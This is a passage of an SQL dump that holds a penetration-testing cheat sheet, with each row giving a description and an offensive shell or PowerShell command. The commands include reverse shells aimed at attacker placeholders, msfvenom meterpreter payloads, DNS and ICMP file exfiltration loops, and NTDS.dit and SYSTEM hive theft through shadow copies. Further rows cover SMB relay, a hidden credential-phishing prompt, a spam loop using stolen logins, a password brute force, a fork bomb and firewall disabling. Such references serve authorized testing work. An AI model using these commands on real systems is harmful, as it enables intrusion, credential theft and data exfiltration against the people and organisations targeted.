17:32:13',' instant web server\n','python -m SimpleHTTPServer [PORT] '),(950,'2017-06-24 17:32:13',' smbrelay targeted\n','smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe] '),(951,'2017-06-24 17:32:18',' smbrelay reflection : note read into http -> smb refelction\n','smbrelayx.py -e [PAYLOAD exe] '),(952,'2017-06-24 17:32:18',' responder NBNS LLMNR\n','/data/hacking/Responder/Responder.py -I eth0 -wrfFd --lm -i [YOUR IP] '),(953,'2017-06-24 17:32:18',' List smb shares on a target host domain and pass are optional, % seperates user from pass\n','smbclient -L [TARGET] -U [DOM]/[USER]%\'[PASS]\' '),(954,'2017-06-24 17:32:19',' text in binaries\n','strings [FILENAME] --bytes=2 |grep \"^sa$\" -A 4 '),(955,'2017-06-24 17:32:19',' Telnet Mail\n','telnet [IP] 25 '),(956,'2017-06-24 17:32:19',' Telnet Mail\n','HELO [FQDN of your RDNS] '),(957,'2017-06-24 17:32:19',' Telnet Mail\n','MAIL FROM: [SENDER ADDRESS] '),(958,'2017-06-24 17:32:20',' Telnet Mail\n','RCPT TO: [RECIPIENT ADDRESS] '),(959,'2017-06-24 17:32:20',' Telnet Mail\n','DATA '),(960,'2017-06-24 17:32:20',' Telnet Mail\n','Subject: [SUBJECT] '),(961,'2017-06-24 17:32:20',' Telnet Mail\n','Date: [DATE] '),(962,'2017-06-24 17:32:20',' Telnet Mail\n','From: [REAL NAME] <[EMAIL]> '),(963,'2017-06-24 17:32:20',' Telnet Mail\n','To: [REAL NAME] <[EMAIL]> '),(964,'2017-06-24 17:32:20',' Telnet Mail\n','[MESSAGE] '),(965,'2017-06-24 17:32:20',' Telnet Mail\n','. (don\'t forget the full stop) '),(966,'2017-06-24 17:32:21',' load balance detection\n','halberd -v -p 10 [URL] '),(967,'2017-06-24 17:32:21',' Get a listing of all users and groups for targeting your post exploitation\n','enum4linux.pl -a -u [USER] -p [PASS] [TARGET] | tee [CLIENTNAME].domainenum '),(968,'2017-06-24 17:32:21',' Get a list of all the users in the domain from a full dump\n','cat [CLIENTNAME].domainenum | grep \"^user\" | cut -d \":\" -f 2 | cut -d \"]\" -f 1 | cut -d \"[\" -f 2 > userlist.txt '),(969,'2017-06-24 17:32:21',' Check for vlans that you can hop to : may need to change the grep for interfaces\n','frogger.sh '),(970,'2017-06-24 17:32:21',' manual vlans\n','vconfig add em1 [VLANID] '),(971,'2017-06-24 17:32:21',' dhcp client\n','dhclient -d -v -4 -pf /tmp/dhclient.pid -lf /tmp/dhclient.lease em1 '),(972,'2017-06-24 17:32:21',' dhcp lease rpm\n','cat `find /var/lib/NetworkManager/*ens10* -type f -mmin -360 -ls | awk {\'print $11\'}` '),(973,'2017-06-24 17:32:21',' dhcp lease deb\n','cat `find /var/lib/dhcp/dhclient*eth0* -type f -mmin -360 -ls | awk {\'print $11\'}` '),(974,'2017-06-24 17:32:21',' dhcp lease\n','ls -lt /var/lib/NetworkManager/ '),(975,'2017-06-24 17:32:22',' route table add\n','route add -net [CIDR] gw [IP] [INTERFACE] '),(976,'2017-06-24 17:32:22',' route table del\n','route del -net 0.0.0.0 gw [GW] eth1 '),(977,'2017-06-24 17:32:23',' Encrypted zip\n','7z a -p -mem=AES report.zip [INPUT FILE] '),(978,'2017-06-24 17:32:24',' hashcat cpu\n','./hashcat-cli64.bin --session=[SESSIONNAME] -m[hash ID] [input file] [dict file] --rules rules/[rule file e.g. best64.rule d3ad0ne.rule etc] '),(979,'2017-06-24 17:32:25',' hashcat assuming that hc is an alias (kraken | pablo)\n','hc --gpu-temp-abort=100 --remove -m5500 netntlmv1.hash -a3 -1 \'?u?l?d\' \'?1?1?1?1?1?1?1?1\' -o hash.crack '),(980,'2017-06-24 17:32:25',' hashcat types\n','500  MD5 Crypt $1 | 7400 SHA256 Crypt $5 | 1800 Sha512 Crypt $6 '),(981,'2017-06-24 17:32:25',' hashcat types\n','1000 NTLM | 3000 LM '),(982,'2017-06-24 17:32:25',' hashcat types\n','1100 MScashv1 | 2100 MScashv2 (802.1X) '),(983,'2017-06-24 17:32:25',' hashcat types\n','2500 WPA/WPA2 '),(984,'2017-06-24 17:32:25',' hashcat types\n','5600 NetNTLMv2 | 5500 NetNTLMv1 | 5400 = IKE-PSK SHA1 | 5300 = IKE-PSK MD5 | '),(985,'2017-06-24 17:32:25',' cvs check out repo\n','cvs checkout [package name] '),(986,'2017-06-24 17:32:25',' cvs update local repo\n','cvs update -d . '),(987,'2017-06-24 17:32:25',' cvs comit change with message\n','cvs commit -m \"[Comment]\" [File inc \"package\"] '),(988,'2017-06-24 17:32:25',' cvs add a new file\n','cvs add [File inc \"package\"] '),(989,'2017-06-24 17:32:26',' cvs delete file\n','cvs release [package or file in package] '),(990,'2017-06-24 17:32:26',' sslscan, you will want to git clone and make static if your in kali\n','for a in $(cat ../nmap/IPs-HTTPS.txt); do sslscan $a; done | tee sslscan-[NET].txt '),(991,'2017-06-24 17:32:26',' sslscan cert checks\n','openssl s_client -connect victim.com:443 (this shows the chain) '),(992,'2017-06-24 17:32:28',' sslscan cert checks\n','openssl s_client -showcerts -connect victim.com:443 2>/dev/null | awk \'$0==\"-----BEGIN CERTIFICATE-----\" {p=1}; p; $0==\"-----END CERTIFICATE-----\" {p=0}\' (this pulls just the certificates for each in the chain) '),(993,'2017-06-24 17:32:28',' sslscan cert checks\n','openssl x509 -noout -text | grep -i \"signature algorithm\\|before\\|after\\|issuer\\|subject:\" (split the above commands output and stick in here, then manually analyse) '),(994,'2017-06-24 17:32:28',' Password Generator\n','genpasswd [CHAR LENGTH] '),(995,'2017-06-24 17:32:28',' dns tunneling\n','iodine -P [pass] [server] '),(996,'2017-06-24 17:32:28',' nmap outbound tcp\n','nmap -sS -Pn --open -T5 -p- [portspoofip] | tee nmap-tcp-outbound.txt '),(997,'2017-06-24 17:32:28',' nmap outbound upd\n','nmap -Pn --open -T5 -sU -p- [portspoofip]| tee nmap-udp-outbound.txt '),(998,'2017-06-24 17:32:29',' nmap smb signing\n','nmap --script smb-security-mode.nse -p445 -iL [hostsfile] -oA nmap-SMBSigning '),(999,'2017-06-24 17:32:29',' nmap devicemap all tcp\n','nmap -sS -n -v -T4 -P0 -p- -oA nmap-tcp-scan -iL subnets.txt '),(1000,'2017-06-24 17:32:29',' nmap devicemap top 1000 udp\n','nmap -sU -n -v -T4 -P0 --top-ports 1000 -oA nmap-udp-scan -iL subnets.txt '),(1001,'2017-06-24 17:32:29',' nmap devicemap\n','grep \"Discovered open port\" nmap-udp-scan.txt | sed \"s/\\// /g\" | sed \"s/ /\\t/g\" | awk -F \"\\t\" {\'print $7\"\\t\"$5\"\\t\"$4\"\\topen\"\'} > devicemap-udp.tsv '),(1002,'2017-06-24 17:32:34',' nmap service discovery\n','for file in $( ls -lash | grep \".gnmap\" | awk {\'print $10\'} ); do cat $file | grep \"Ports\" | grep \"open\" | awk {\'print $2\'} | sort -u > IPs-`echo $file | cut -d \"-\" -f 2 | cut -d \".\" -f 1;`.txt; done '),(1003,'2017-06-24 17:32:34',' nmap service discovery\n','cat nmapScan-[SERVICE].gnmap | grep \"Ports\" | grep \"open\" | grep -v \"open|filtered\" | awk {\'print $2\'} | sort -u > IPs-[SERVICE].txt '),(1004,'2017-06-24 17:32:34',' Convert a user list in format \"first last\" to flast\n','cat users | awk \'{print substr ($0, 1, 1),$2}\' | tr [A-Z] [a-z] | sort | uniq '),(1005,'2017-06-24 17:32:34',' bash reverse shell using a file handle \'5\'\n','exec 5<>/dev/tcp/[me]/[port]; while read line 0<&5; do $line 2>&5 >&5; done '),(1006,'2017-06-24 17:32:34',' telnet reverse shell\n','rm -f /tmp/p; mknod /tmp/p p && nc [me] [port] 0/tmp/p '),(1007,'2017-06-24 17:32:34',' telnet reverse shell\n','telnet [me] [port]| /bin/bash | telnet [me] [lport] '),(1008,'2017-06-24 17:32:34',' perl windows reverse shell\n','perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,\"[me]:80\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\' '),(1009,'2017-06-24 17:32:34',' Java reverse shell - replace ; with newline\n','r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor() '),(1010,'2017-06-24 17:32:35',' Take a screenshot of a HTTP service\n','nmap -iL hosts -sC --script http-screenshot -p 80,443,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192,6992,16993,16994,16995,623,664 -v -n '),(1011,'2017-06-24 17:32:35',' moount VDI disk image\n','modprobe nbd  max_part=16;  qemu-nbd -c /dev/nbd0 [File]; fdisk -l /dev/nbd0 '),(1012,'2017-06-24 17:32:35',' Mount LVM filesytem / image\n','losetup /dev/loop0 [file]; kpartx -a /dev/loop0; vgscan; vgchange -ay changethishostname-vg; mount /dev/changethishostname-vg/root mnt/ '),(1013,'2017-06-24 17:32:40',' Ecrypt FS mounting\n','printf \"%s\" $i | ecryptfs-unwrap-passphrase .ecryptfs/victim/.ecryptfs/wrapped-passphrase -; ecryptfs-add-passphrase -fnek; mount -t ecryptfs .ecryptfs/victim/.Private/ test/ '),(1014,'2017-06-24 17:32:40',' create medusa or hydra password list from cracked hashes\n','cat DC_dump.txt | awk -F : \'{print $1\":\"$4}\' | sort -k 2 -t : > sorted_hash; cat ntlm_cracked | sort -k 1 > sorted_cracked; join -t : -1 2 sorted_hash -2 1 sorted_cracked  >> pass_info '),(1015,'2017-06-24 17:32:40',' list network connections\n','netstat -tulpen '),(1016,'2017-06-24 17:32:45',' print vpn keys\n','ip xfrm state list '),(1017,'2017-06-24 17:32:50',' enable ip forwarding in the kernel temporarily\n','echo 1 > /proc/sys/net/ipv4/ip_forward '),(1018,'2017-06-24 17:32:50',' Fork Bomb : CRASH SYSTEM\n',':(){:|:&;: '),(1019,'2017-06-24 17:32:51',' Iptables port forward\n','iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j LOG; iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j DNAT --to-destination [rhost]:[rport]; iptables -A FORWARD -p tcp -d [ip] --dport [port] -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT '),(1020,'2017-06-24 17:32:51',' list users without password\n','logins -p '),(1021,'2017-06-24 17:32:51',' list services\n','svsc -a '),(1022,'2017-06-24 17:32:51',' list processes\n','prstat -a '),(1023,'2017-06-24 17:32:51',' system information\n','ver '),(1024,'2017-06-24 17:32:51',' Spawn a cmd in a gui window\n','xterm -bg black -title \"TryH4rD3r\" -e \"ls -la;read\" '),(1025,'2017-06-24 17:32:51',' Take a screenshot of a RDP server (provided by rdpy)\n','rdpy-rdpscreenshot.py 1.1.1.1 '),(1026,'2017-06-24 17:32:51',' take a screenshot from a open X11 and convert it to a jpg\n','xwd -display [victim] :0 -root -out /tmp/[victim].xpm;xwd -display ip :0 -root -out /tmp/[victim].xpm; convert /tmp/[victim]; xpm -resize 1280x1024 /tmp/[victim].jpg '),(1027,'2017-06-24 17:32:52',' capture ping replies\n','tcpdump -i ethO \'icmp[icmptype] == icmp-echoreply\' '),(1028,'2017-06-24 17:32:52',' remote system info\n','systeminfo /S [victim] /U [domain]/[user] /P [pass] '),(1029,'2017-06-24 17:32:52',' list drives\n','fsutil fsinfo drives '),(1030,'2017-06-24 17:32:52',' search for text in the reg\n','reg query HKLM /f [text]  /t REG SZ /s '),(1031,'2017-06-24 17:32:53',' grep for text in files\n','findstr /si [text] \'.txt|xml|xls\' '),(1032,'2017-06-24 17:32:53',' show hosts in the current domain or add a domain for searching\n','net view /domain '),(1033,'2017-06-24 17:32:53',' current smb shares\n','net share '),(1034,'2017-06-24 17:32:53',' active sessions\n','net session '),(1035,'2017-06-24 17:32:53',' Share a directory with the world, probably don\'t want the world\n','net share [sharename] [folder] /GRANT:Everyone,FULL '),(1036,'2017-06-24 17:32:53',' Create a service on remote machine\n','sc \\\\[victim] create [name] binpath=[pathtoexe] start= auto '),(1037,'2017-06-24 17:32:54',' copy a remote file to lcwd\n','xcopy /s \\\\[victim] \\dir [directory] '),(1038,'2017-06-24 17:32:54',' remote shutdown\n','shutdown /m \\\\[victim] /r /t 0 /f '),(1039,'2017-06-24 17:32:54',' show dnscache\n','ipconfig /displaydns '),(1040,'2017-06-24 17:32:54',' listening ports\n','netstat -anop | findstr LISTEN '),(1041,'2017-06-24 17:32:54',' download a file, no longer default\n','tftp -I [victim] GET [file] '),(1042,'2017-06-24 17:32:54',' show interface information\n','netsh interface ip show '),(1043,'2017-06-24 17:32:54',' set static ip\n','netsh interface ip set address local static [ip] [mask] [gw] [ID] '),(1044,'2017-06-24 17:32:54',' set DNS server\n','netsh interface ip set dns local static [ip] '),(1045,'2017-06-24 17:32:54',' enable DHCP\n','netsh interface ip set address local dhcp '),(1046,'2017-06-24 17:32:54',' compress file\n','makecab [file] '),(1047,'2017-06-24 17:33:00',' uninstall patch : 2871997\n','wusa.exe /uninstall /kb: [id] '),(1048,'2017-06-24 17:33:00',' lock the workstation\n','rundll32.dll user32.dll LockWorkstation '),(1049,'2017-06-24 17:33:00',' disable local firewall\n','netsh advfirewall set currentprofile state off;netsh advfirewall set allprofiles state off; '),(1050,'2017-06-24 17:33:00',' re-enable CMD\n','reg add HKCU\\Software\\Policies\\microsoft\\Windows\\System /v DisableCHD /t '),(1051,'2017-06-24 17:33:00',' windows psexec : \\\\127.0.0.1\\c$\\cmd.exe -p can be pass OR hash\n','psexec /accepteula \\\\[victim] -u [domain]\\[user] -p [password] -c -f \\\\[victim]\\[share\\[file] '),(1052,'2017-06-24 17:33:00',' enable RDP\n','reg add \"HKEY LOCAL MACHINE\\SYSTEM\\CurentControlSet\\Control \\TerminalServer\" /v DenyTSConnections /t REG_DWORD /d 0 /f '),(1053,'2017-06-24 17:33:00',' Disable NLA on RDP\n','reg add \"HKEY LOCAL MACHINE\\SYSTEM\\CurentControlSet\\Control \\TerminalServer\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f '),(1054,'2017-06-24 17:33:00',' start wmic service\n','wmic startupwmic service '),(1055,'2017-06-24 17:33:00',' list all processes\n','wmic process list full '),(1056,'2017-06-24 17:33:00',' Domain and DC info\n','wmic ntdomain list '),(1057,'2017-06-24 17:33:00',' list patches\n','wmic qfe '),(1058,'2017-06-24 17:33:00',' execute command\n','wrnic process call create \"[cmd]\" '),(1059,'2017-06-24 17:33:11',' kill process\n','wmic process where name=\"[cmd]\" call terminate '),(1060,'2017-06-24 17:33:11',' view logical shares\n','wmic logicaldisk get description,name '),(1061,'2017-06-24 17:33:12',' execute command on remote host from remote smb share\n','wmic /node:[victim] /user:[domain]\\[user] /password:[password] process call create \"\\\\[host]\\[share]\\[exe]\" '),(1062,'2017-06-24 17:33:12',' get logged in users from the remote host\n','wmic /node:[victim] computersystern get username '),(1063,'2017-06-24 17:33:12',' list remote processes every second\n','wmic /node:[victim] process list brief /every:1 '),(1064,'2017-06-24 17:33:12',' enble rdp on remote host\n','wmic /node:\"[victim]\" path Win32_TerminalServiceSetting where AllowTSConnections=\"0\" call SetAllowTSConnections \"1\" '),(1065,'2017-06-24 17:33:12',' How many times has someone logged in\n','wmic netlogin where (name like \"%[user]%\") get numberoflogons '),(1066,'2017-06-24 17:33:13',' unquoted service path search add node for remote sys\n','wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\windows\\\\\" | findstr /i /v \"\"\" '),(1067,'2017-06-24 17:33:13',' List volume shadow copies\n','wmic /node:[victim] /user:\"[domain]\\[user]\" /password:[pass] process call create \"cmd /c vssadmin list shadows 2 &1 >> c:\\temp\\vss.txt\" '),(1068,'2017-06-24 17:33:13',' create volume shadow copy for c\n','wmic /node:[victim] /User:[domain]\\[user]\" /password:[pass] process call create \"cmd /c vssadmin create shadow /for=C: 2 &1 >> C:\\temp\\create_vss.txt\" '),(1069,'2017-06-24 17:33:13',' copy system out of a volume shadow copy\n','wmic /node:[victim] /User:[domain]\\[user]\" /password:[pass] process call create \"cmd /c copy \\\\?\\GLOBALROOT\\Device\\[vsc]\\Windows\\System32\\config\\SYSTEM c:\\temp\\SYSTEM\" 2 &1 >> c:\\temp\\copy_system.txt '),(1070,'2017-06-24 17:33:13',' copy out ntds from the voulme shadow copy\n','wmic /node:[victim] /User:[domain]\\[user]\" /password:[pass] process call create \"cmd /c copy \\\\?\\GLOBALROOT\\Device\\[vsc]\\NTDS\\NTDS.dit c:\\temp\\ntds.dit\" 2 &1 >> c:\\temp\\copy_ntds.txt '),(1071,'2017-06-24 17:33:18',' Parse the SYSTEM and ntds with impacket\n','secretsdump.py  -hashes LMHASH:NTHASH -system ../SYSTEM -ntds ../ntds.dit local | tee hashes '),(1072,'2017-06-24 17:33:18',' powershell wget\n','invoke-webrequest '),(1073,'2017-06-24 17:33:18',' also powershell wget\n','wget '),(1074,'2017-06-24 17:33:18',' also powershell wget\n','(new-object system.net.webclient).downloadFile(\"[url]\",\"[dest]\") '),(1075,'2017-06-24 17:33:19',' powershell type file\n','get-content '),(1076,'2017-06-24 17:33:19',' powershell services\n','get-service '),(1077,'2017-06-24 17:33:20',' list of drives : cd Env:\\ . . . mind . . . blown\n','get-psdrive '),(1078,'2017-06-24 17:33:20',' RTFM *cough*\n','get-help '),(1079,'2017-06-24 17:33:20',' list interfaces with wmi\n','get-wmiobject -list \'netework\' '),(1080,'2017-06-24 17:33:20',' get dns addr tab after :: for more choices\n','[Net.DNS]::GetHostEntry(\"ip\") '),(1081,'2017-06-24 17:33:20',' get system information\n','Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\\temp\\os.txt '),(1082,'2017-06-24 17:33:20',' powershell mount remote share : think sysinternals remote share\n','New-PSDrive -Persist -PSProvider FileSjstem -Root \\\\[ip]\\tools -Name i '),(1083,'2017-06-24 17:33:20',' txt files changed after the 13 Jan 2017\n','Get-ChildItem -Path c:\\ -Force -Recurse -Filter *.txt -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt \"2017-01-13\"} '),(1084,'2017-06-24 17:33:20',' powershell port scanning\n','$ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip \": \"$port\" : Closed\";}else{echo $ip \": \"$port\" : Open\";}$socket = $NULL;}} '),(1085,'2017-06-24 17:33:20',' Ping ip with timeout of 500\n','$ping = New-Object System.Net.Networkinformation.ping;$ping.Send(\"[ip]\",50O); '),(1086,'2017-06-24 17:33:21',' Ask user for credentials\n','powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential(\"[title]\",\"[message]\",\"[user]\",\"[domain]\") '),(1087,'2017-06-24 17:33:21',' powershell run on schedule, match says when run\n','powershell.exe -Command \"do {if ((Get-Date -format yyyymmdd-HHmm) -match \'201308(0[8-9]|1[0-1])|0[8-9]|1[0-7])[0-5][0-9]\'){Start-Process -WindowStyle Hidden \"[exe]\";Start-Sleep -s 14400}}while(1)\" '),(1088,'2017-06-24 17:33:21',' Powershell send an email\n','powershell.exe Send-MailMessage -to \"[victim]\" -from \"[from]\" -subject \"[subject]\" -a \"[Attach file path]\" -body \"[Body]\" -SmtpServer [ServerIP] '),(1089,'2017-06-24 17:33:21',' list hostname and ip for domain pc\'s\n','Get-WmiObject -ComputerName [DC] -Namesapce root\\microsoftDNS -class MicrosoftDNS_ResourceRecord -Filter \"domainname=\'[domain]\' | select textrepresentation '),(1090,'2017-06-24 17:33:21',' Powershell upload file VIA post, script must write this out\n','powershell.exe -noprofile -noninteractive -command \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server=\"[$ip]/[script]\";$filepath=\"c:/temp/SYSTEM\";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);\" '),(1091,'2017-06-24 17:33:21',' powershell shell\n','msfvenom -p Windows/meterpreter/reverse_https -f psh -a x86 LHOST=[lhost] LPORT=[lport] audit.ps1 '),(1092,'2017-06-24 17:33:21',' Windows information in the reg\n','HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion '),(1093,'2017-06-24 17:33:21',' Mapped drives in reg\n','HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU '),(1094,'2017-06-24 17:33:21',' Mounted devices\n','HKLM\\System\\MountedDevices '),(1095,'2017-06-24 17:33:21',' USB Devices\n','HKLM\\System\\CurrentControlSet\\Enum\\USBStor '),(1096,'2017-06-24 17:33:22',' enable ip routing in windows, use as GW\n','HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\IPEnableRouter '),(1097,'2017-06-24 17:33:22',' Audit policy\n','HKLM\\Security\\Policy\\PolAdTev '),(1098,'2017-06-24 17:33:23',' Kernel or User Services\n','HKLM\\Software\\Microsoft\\Windows NT\\CurrentControlSet\\Services '),(1099,'2017-06-24 17:33:23',' Machine or User software\n','HKLM|HKCU\\Software '),(1100,'2017-06-24 17:33:23',' Recent Documents\n','HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs '),(1101,'2017-06-24 17:33:24',' Recent user location (MRU Most Recntly used)\n','HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedMRU & \\OpenSaveMRU '),(1102,'2017-06-24 17:33:24',' Typed Urls\n','HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs '),(1103,'2017-06-24 17:33:24',' list users\n','dsquery user -limit 0 '),(1104,'2017-06-24 17:33:29',' List groups for domain.com\n','dsquery group \"cn=users,dc=[domain],dc=[tld]\" '),(1105,'2017-06-24 17:33:29',' Get Domain admins (prefer net groups \"domain Admins\")\n','dsquery group -name \"domain admins\" | dsget group -members -expand '),(1106,'2017-06-24 17:33:29',' get groups for user (net groups [user])\n','dsquery user -name [user] | dsget user -memberof -expand '),(1107,'2017-06-24 17:33:29',' get user login name\n','dsquery user -name [user] | dsget user -samid '),(1108,'2017-06-24 17:33:30',' List accounts that have been inactive for two weeks\n','dsquery user -inactive 2 '),(1109,'2017-06-24 17:33:35',' List os\'s in the domain\n','dsquery * \"DC=[domain],DC=[tld]\" -scope subtree -attr \"cn\" \"opperatingSystem\" '),(1110,'2017-06-24 17:33:36',' list site names\n','dsquery site -o rdn -limit 0 '),(1111,'2017-06-24 17:33:36',' list subnets within the sites shown\n','dsquery subnet -site [site] -o rdn '),(1112,'2017-06-24 17:33:36',' list servers within site\n','dsquery server -site [site] -o rdn '),(1113,'2017-06-24 17:33:36',' list DC\'s\n','host [domain] '),(1114,'2017-06-24 17:33:36',' hash list\n','https://hashcat.net/wiki/doku.php?id=example_hashes '),(1115,'2017-06-24 17:33:36',' Simple powershell brute force, user input list, checks the password \'password\'\n','Function Test-ADAuthentication {param($username,$password);echo \"$username $password\";(new-object directoryservices.directoryentry\"\",$username,$password).psbase.name -ne $null}; forEach ($userName in Get-Content \"user_logins.txt\"){Test-ADAuthentication $userName password >> test4.txt;} '),(1116,'2017-06-24 17:33:41',' see /etc/services\n','common ports '),(1117,'2017-06-24 17:33:41',' Networking Time to Live\n','TTL: 128 = Windows | 64 = linux | 255 = generic OR solaris '),(1118,'2017-06-24 17:33:41',' Networking Time to Live\n','Window Size: 5840 = Linux | 5720 = Google Nix | 65535 = XP or BSD | 8192 = Visa and above | 4128 = Cisco Router '),(1119,'2017-06-24 17:33:41',' Classfull networks have not existed since 1993 cisco GTFO with telling people they exist\n','Class Ip ranges : Go away, there was A,B,C,D,E. WAS AS IN NOT ANY MORE! '),(1120,'2017-06-24 17:33:42',' please use ipcalc, there is no l33tness in doing it in your head\n','Subnet ranges : /20 255.255.240.0 4096 hosts '),(1121,'2017-06-24 17:33:42',' Ip subnets\n','ipcalc -bnmp 10.0.0.1/20 '),(1122,'2017-06-24 17:33:42',' Route IPV6 through ipv4 for things that don\'t support it\n','socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[RHOST]:[RPORT] ./[tool] 127.00.0.1:8080 '),(1123,'2017-06-24 17:33:42',' raise privs cisco\n','enable '),(1124,'2017-06-24 17:33:43',' start configuration\n','conf t '),(1125,'2017-06-24 17:33:43',' show sessions\n','show session '),(1126,'2017-06-24 17:33:43',' show version\n','show version '),(1127,'2017-06-24 17:33:43',' show the config which is running in flash, looking for password 7 and the like\n','show running-config '),(1128,'2017-06-24 17:33:43',' show the config which runs on start up\n','show startup-config '),(1129,'2017-06-24 17:33:43',' show interface information : add breif for less\n','show ip interface '),(1130,'2017-06-24 17:33:44',' show the routes of the switch\n','show ip route '),(1131,'2017-06-24 17:33:44',' show the ACL for the switch\n','show access-lists '),(1132,'2017-06-24 17:33:44',' Bypass auth on ios 11.2-12.2\n','http://[ip]/level/56/exec/show/config '),(1133,'2017-06-24 17:33:44',' replay packets to network\n','file2cable -i eth0 -f [file] '),(1134,'2017-06-24 17:33:44',' Reverse look up on range\n','dnsrecon -t rvs -i 10.0.0.1,10.0.0.255 '),(1135,'2017-06-24 17:33:44',' brute names\n','dnsrecon -t std -d [domain] '),(1136,'2017-06-24 17:33:45',' do a zone transfer request (just use host . . .)\n','dnsrecon -t axfr -d [domain] '),(1137,'2017-06-24 17:33:45',' uninteractive FTP, read commands from file\n','ftp -s ftp.txt '),(1138,'2017-06-24 17:33:45',' exfil file through DNS, may want to encrypt, also assuming you have a short domain\n','for line in `base64 -w 230 [file]`; do host $line.[hostname]; done '),(1139,'2017-06-24 17:33:45',' look for a free short domain, good luck\n','for a in {a..z}; do for b in {a..z}; do for c in {a..z}; do for d in {a..z}; do whois $a$b.$c$d; done; done;done;done '),(1140,'2017-06-24 17:33:45',' Exfil over icmp\n','for line in `base64 -w 1000 [file]`; do ping -s 1000 -c 1 -M do [ip]; done '),(1141,'2017-06-24 17:33:45',' forward local traffic htting lport to [rip]:[rport]\n','fpipe.exe -l [lport] -r [rip] [ip] '),(1142,'2017-06-24 17:33:45',' forward local traffic htting lport to [rip]:[rport]\n','socat TCP4:LISTEN:[lport] TCP4:[rip]:[rport] '),(1143,'2017-06-24 17:33:45',' tcp port scanning from bash, just wireshark on the ip, useful if you have cmd execution on web app\n','for i in {1..65000}; do echo 1 > /dev/tcp/[ip]/$i; echo $i; done '),(1144,'2017-06-24 17:33:55',' ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1\n','ssh -o StrictHostKeyChecking=no -t -t -i [private_key] -R [lport]:[rhost]:[rip] [user]@[ip] '),(1145,'2017-06-24 17:33:55',' ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1. Privte key needs to be in putty format, a PPK\n','plink.exe -N -i [private_key] -R [lport]:[rhost]:[rip] -l [user] [ip] '),(1146,'2017-06-24 17:33:55',' set up a socks proxy, proxycahins may help also\n','ssh -D [port] [user]@[ip] '),(1147,'2017-06-24 17:33:56',' create a evil calc\n','msfvenom --payload windows/meterpreter/reverse_tcp --format exe --template calc.exe -k --encoder x86/shikata_ga_ni -i 5 LHOST=[lhost] LPORT=[lport] evil.exe '),(1148,'2017-06-24 17:33:56',' try to make the switch fall over, and turn into a hub\n','ettercap -TP rand_flood '),(1149,'2017-06-24 17:33:56',' Hash byte lengths\n','hash lengths : MD5=16 | SHA1=20 | SHA256=32 | SHA512=64 '),(1150,'2017-06-24 17:33:59',' generate user list from PDF\'s, you can get more info to such as pdf maker\n','for i in *; do pdfinfo $i | egrep -i \"Auth\"; done  | sort '),(1151,'2017-06-24 17:33:59',' Loop around \'dets\' (user:pass) and send an email through an authenticated mailserver with an attached file whos contents is stored in \'email\'\n','for i in `cat dets`; do echo \"Sening Spam from $i\"; mailx -s \"Report Attached\" -r \"`echo $i | awk -F @ \'{print $1}\'`<`echo $i | awk -F : \'{print $1}\'`>\" -a report.pdf -S smtp-auth=login -S smtp-auth-user=\"`echo $i | awk -F : \'{print $1}\'`\" -S smtp-auth-password=\"` echo $i | awk -F : \'{print $2}\'`\" -S ssl-verify=ignore -v -S smtp=\"10.11.1.229\" [victim] < email;echo _________; done '),(1152,'2017-06-24 17:34:00',' Common operations on data\n','https://gchq.github.io/CyberChef/ '),(1153,'2017-06-24 17:34:00',' List windows scheduled tasks, older windows defender\n','schtasks /query /fo LIST /v '),(1154,'2017-06-24 17:34:00',' list installed patches on windows\n','wmic qfe get Caption,Description,HotFixID,InstalledOn '),(1155,'2017-06-24 17:34:00',' Do MSI\'s have admin rights?\n','reg query [HKCU|HKLM]\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated '),(1156,'2017-06-24 17:34:01',' show the current path to see if we can subvert anything\n','echo %path% '),(1157,'2017-06-24 17:34:01',' Show service permissions, look for AU|AN|DU|LG, manual AccessChk, may help with bob ;)\n','sc sdshow [service] '),(1158,'2017-06-24 17:34:01',' Do a netbios name query.\n','nmblookup [name] '),(1159,'2017-06-24 17:34:01',' Pretty terminal PS1 that is copy n paste safe\n','export PS1=\"# \\A:\\[$(tput sgr0)\\]\\[\\033[38;5;1m\\]\\u:\\W:\\[$(tput sgr0)\\] \" '),(1160,'2017-06-24 17:34:01',' search the manual page names and descriptions\n','apropos [keyword] '),(1161,'2017-06-24 17:34:06',' Query the remote ntp time\n','sntp [ip] '),(1162,'2017-06-24 17:34:06',' Ask for a zone transfer\n','host -t axfr [ip] '),(1163,'2017-06-24 17:34:06',' show users rlogin\n','rusers -al [ip] '),(1164,'2017-06-24 17:34:09',' mount a share within windows\n','net use z:\\ \\\\[ip]\\[share] /user:[domain]\\[username] [password] /p:no [password] '),(1165,'2017-06-24 17:34:09',' List users of the 